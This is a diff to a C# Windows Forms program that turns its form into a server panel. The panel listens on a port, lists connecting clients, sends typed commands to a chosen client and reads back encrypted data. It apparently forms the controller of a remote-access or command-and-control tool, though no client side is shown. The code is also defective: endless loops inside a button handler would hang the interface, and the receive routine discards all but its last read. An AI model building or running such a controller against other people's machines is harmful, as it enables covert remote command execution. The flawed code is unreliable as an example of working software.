@@ -17,11 +17,13 @@ using System.Windows.Forms;
 
 namespace PR0T0TYP3
 {
-	public partial class PR0T0TYP3_FORM : Form
+	public partial class PR0T0TYP3_SERVER : Form
 	{
 		public string bufferincmessage { get; private set; }
 
-		public PR0T0TYP3_FORM()
+		public TcpClient clientSelected { get; set; }
+
+		public PR0T0TYP3_SERVER()
 		{
 			InitializeComponent();
 		}
@@ -75,6 +77,7 @@ namespace PR0T0TYP3
 
 		private void portListenButton_Click(object sender, EventArgs e)
 		{
+			int count = 0;
 			Listener listener = new Listener();
 			int portToListen = Convert.ToInt32(portListenText.Text);
 			IPAddress myIP = GetExternalIPAddress();
@@ -87,16 +90,56 @@ namespace PR0T0TYP3
 					listener.port = portToListen;
 					listener.ip = localHost;
 					listener.serverstart();
-					//Add stuff later
+					foreach (var item in listener.addresses)
+					{
+						IpAddresses.Rows.Add(item, count);
+						count++;
+					}
+					while (true)
+					{
+						int selected = IpAddresses.SelectedRows[0].Index;
+						clientSelected = listener.list_clients[selected];
+					}
 				}
 				else
 				{
 					listener.port = portToListen;
 					listener.ip = myIP;
 					listener.serverstart();
-					//Add stuff later
+					foreach (var item in listener.addresses)
+					{
+						IpAddresses.Rows.Add(item, count);
+						count++;
+					}
+					while (true)
+					{
+						int selected = IpAddresses.SelectedRows[0].Index;
+						clientSelected = listener.list_clients[selected];
+					}
 				}
 			}
+		}
+
+		public static String DownloadData(TcpClient curClient)
+		{
+			String dataS = "";
+			while (true)
+			{
+				byte[] data = new byte[4096];
+				NetworkStream stream = curClient.GetStream();
+				int byteCount = stream.Read(data, 0, data.Length);
+
+				if (byteCount == 0)
+				{
+					break;
+				}
+
+				dataS = decrypt(data);
+			}
+			if (!String.IsNullOrEmpty(dataS))
+				return dataS;
+			else
+				return null;
 		}
 
 		public static IPAddress GetLocalIPAddress()
@@ -268,6 +311,20 @@ namespace PR0T0TYP3
 			}
 
 			return true;
+		}
+
+		private void cmdButton_Click(object sender, EventArgs e)
+		{
+			try
+			{
+				byte[] command = Encoding.ASCII.GetBytes(cmdInput.Text);
+				NetworkStream curStream = clientSelected.GetStream();
+				curStream.Write(command, 0, command.Length);
+			}
+			catch (Exception)
+			{
+				MessageBox.Show("Make sure you select a client first!");
+			}
 		}
 	}
 }
